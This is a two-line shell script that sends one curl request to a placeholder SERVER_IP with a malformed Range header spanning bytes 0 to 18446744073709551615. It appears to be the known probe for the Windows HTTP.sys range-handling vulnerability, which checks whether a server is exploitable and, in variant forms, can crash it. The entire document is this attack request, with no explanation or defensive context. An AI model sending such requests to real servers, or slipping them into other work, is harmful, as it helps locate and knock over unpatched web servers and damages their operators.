#!/bin/sh

curl -v SERVER_IP -H "Host: anything" -H "Range: bytes=0-18446744073709551615"
